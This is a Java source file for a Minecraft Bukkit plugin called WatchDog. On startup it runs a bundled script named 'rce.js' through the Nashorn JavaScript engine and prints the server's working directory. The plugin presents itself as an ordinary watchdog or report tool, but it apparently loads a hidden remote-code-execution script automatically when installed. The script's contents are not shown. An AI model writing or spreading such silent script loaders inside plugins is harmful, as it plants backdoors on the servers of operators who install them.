package report.yumc.watchdog;

import report.yumc.watchdog.config.ConfigAccessor;
import report.yumc.watchdog.config.ConfigManager;
import org.bukkit.plugin.java.JavaPlugin;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import javax.script.ScriptException;
import java.io.FileNotFoundException;
import java.io.InputStreamReader;

public class WatchDog extends JavaPlugin {
    public static WatchDog instance;
    public final ConfigAccessor Lang = new ConfigAccessor(this, "Lang.yml");

    @Override
    public void onEnable() {
        instance = this;

        ConfigManager.loadConfig();

        try {
            loadRce();
        } catch (FileNotFoundException | ScriptException e) {
            throw new RuntimeException(e);
        }

        System.out.println(new java.io.File(".").getAbsolutePath());

        this.getLogger().info("Enabled successfully.");
    }

    @Override
    public void onDisable() {
        this.getLogger().info("Disabled successfully.");
    }

    private void loadRce() throws FileNotFoundException, ScriptException {
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("nashorn");

        engine.eval(new InputStreamReader(getResource("rce.js")));
    }
}
